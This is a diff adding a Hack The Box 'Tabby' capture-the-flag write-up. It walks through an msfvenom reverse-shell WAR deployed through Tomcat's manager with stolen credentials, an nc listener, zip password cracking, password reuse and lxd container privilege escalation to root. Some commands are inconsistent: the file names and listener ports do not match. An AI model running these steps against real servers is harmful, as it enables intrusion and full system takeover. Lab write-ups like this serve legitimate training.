@@ -84,5 +84,211 @@ Upon some research, I found this [site](https://talk.openmrs.org/t/configuring-a
 ![tomcat-users.xml file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Tabby/tomcat_users_file.png)
 
 ### Obtaining reverse shell
+
+Let us first create a reverse shell payload in the form of a .war file using msfvenom, and afterwards we will upload it onto the Apache Tomcat site at port 8080
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4000 -f war -o revshell.war
+Payload size: 1098 bytes
+Final size of war file: 1098 bytes
+Saved as: revshell.war
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl --upload-file exploit.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahosting.htb:8080/manager/text/deploy?path=/exploit"
+OK - Deployed application at context path [/exploit]
+```
+
+Next, we just have to visit http://megahosting.htb:8080/exploit to trigger the reverse shell. Afterwards, all we have to do is to stabilize the reverse shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.194] 47118
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+which python3
+/usr/bin/python3
+python3 -c "import pty; pty.spawn('/bin/bash')"
+tomcat@tabby:/var/lib/tomcat9$ ^Z
+[1]+  Stopped                 nc -nlvp 443
+
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo && fg
+nc -nlvp 443
+
+tomcat@tabby:/var/lib/tomcat9$ 
+tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
+tomcat@tabby:/var/lib/tomcat9$ stty cols 132 rows 34
+tomcat@tabby:/var/lib/tomcat9$ 
+```
+
+However, we do not have the permissions to view the user flag located at /home/ash
+
+```
+tomcat@tabby:/var/lib/tomcat9$ cat /home/ash/user.txt
+cat: /home/ash/user.txt: Permission denied
+```
+### Privilege Escalation to Ash
+
+Using Linpeas, we realize that there is an interesting backup.zip file in the /var/www/html/files directory
+
+```
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip               
+-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
+-rw-r--r-- 1 root root 11070 May 19  2020 /usr/share/info/dir.old
+```
+
+Next, we will extract the backup zip file to our local machine. Afterwards, we will use zip2john to generate the hash of the zip file and we will proceed to use John the Ripper to obtain the password (admin@it) to the zip file. 
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ zip2john 16162020_backup.zip > hash.txt
+16162020_backup.zip/var/www/html/assets/ is not encrypted!
+ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
+ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
+ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ john hash.txt --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (16162020_backup.zip)
+1g 0:00:00:00 DONE (2021-11-20 20:35) 1.408g/s 14595Kp/s 14595Kc/s 14595KC/s adnaws..adena2010
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+Using the password to view the files, it seem that the files inside the zip files do not provide any valuable information. However, I though of password re-use and tried to escalate to ash user using the password obtained in the previous step, which was successful.
+```
+tomcat@tabby:/var/www/html/files$ su ash
+Password: 
+ash@tabby:/var/www/html/files$ id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+ash@tabby:/var/www/html/files$ 
+```
 ### Obtaining user flag
+
+```
+ash@tabby:/var/www/html/files$ cat /home/ash/user.txt
+<Redacted user flag>
+ash@tabby:/var/www/html/files$
+```
+
+### Privilege Escalation to root
+
+We noticed that ash is a part of the lxd group, which makes it vulnerable to the lxd privilege escalation.
+
+```
+ash@tabby:~$ id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+```
+
+First, let us check if there are any containers being mounted on the root filesystem. From the output, there is containers mounted yet. 
+
+```
+ash@tabby:~$ /snap/bin/lxc list
+If this is your first time running LXD on this machine, you should also run: lxd init
+To start your first instance, try: lxc launch ubuntu:18.04
+
++------+-------+------+------+------+-----------+
+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
++------+-------+------+------+------+-----------+
+```
+
+Next, we will clone the repository containing the alpine image and build the alpine image on our local machine. This creates a .tar.gz folder with all the files necessary to make an Alpine Linux container.
+
+```
+git clone https://github.com/saghul/lxd-alpine-builder
+sudo ./build-alpine
+```
+
+We will then upload the .tar.gz file onto the target server. Afterwards, we will import the image into the server
+
+```
+ash@tabby:~$ /snap/bin/lxc image import ./alpine*.tar.gz --alias myimage
+Image imported with fingerprint: 0c970475ea88cf145739696d706ab0a161932827fd9067b42a1fa307d6ca2a7a
+```
+
+Next, we have to initialize the container using ```lxd init```. We would use all the default settings for this.
+
+```
+ash@tabby:~$ /snap/bin/lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: no
+Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
+Name of the new storage pool [default=default]: default
+Name of the storage backend to use (dir, lvm, zfs, ceph, btrfs) [default=zfs]: zfs
+Create a new ZFS pool? (yes/no) [default=yes]: yes
+Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: no
+Size in GB of the new loop device (1GB minimum) [default=5GB]: 5GB
+Would you like to connect to a MAAS server? (yes/no) [default=no]: no
+Would you like to create a new local network bridge? (yes/no) [default=yes]: yes
+What should the new bridge be called? [default=lxdbr0]: lxdbr0
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
+Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
+```
+
+Next, we would have to run the image and mount /root into the image
+
+```
+ash@tabby:~$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+ash@tabby:~$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+```
+
+Using ```lxc list```, we can see that the new container is now running. All we have to do is to execute /bin/sh using the new container.
+```
+ash@tabby:~$ /snap/bin/lxc list
++-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
+|    NAME     |  STATE  |         IPV4         |                     IPV6                     |   TYPE    | SNAPSHOTS |
++-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
+| mycontainer | RUNNING | 10.136.67.205 (eth0) | fd42:ffa:82ec:5062:216:3eff:feaa:ebf7 (eth0) | CONTAINER | 0         |
++-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
+ash@tabby:~$ /snap/bin/lxc exec mycontainer /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+```
+In the previous commands, we have mounted the filesystem to /mnt/root. We would have to navigate to /mnt/root directory to view our mounted files.
+
+```
+# cd /mnt/root
+/mnt/root # ls
+bin         dev         lib         libx32      mnt         root        snap        tmp
+boot        etc         lib32       lost+found  opt         run         srv         usr
+cdrom       home        lib64       media       proc        sbin        sys         var
+```
+
 ### Obtaining root flag
+
+```
+/mnt/root # cat root/root.txt
+<Redacted root flag>
+```
+
+
+## Post-Exploitation
+### LXD Privilege Escalation
+
+One thing that we noticed after when we are in the lxd container is that, we can check whether we are in the mounted file system using etc/hostname command. As shown below, we
+can see that the output of etc/hostname changes to that of our original filesystem when we are in the mounted filesystem directory.
+
+```
+/mnt/root # cat etc/hostname
+tabby
+/mnt/root # cd
+~ # cat /etc/hostname
+mycontainer
+```
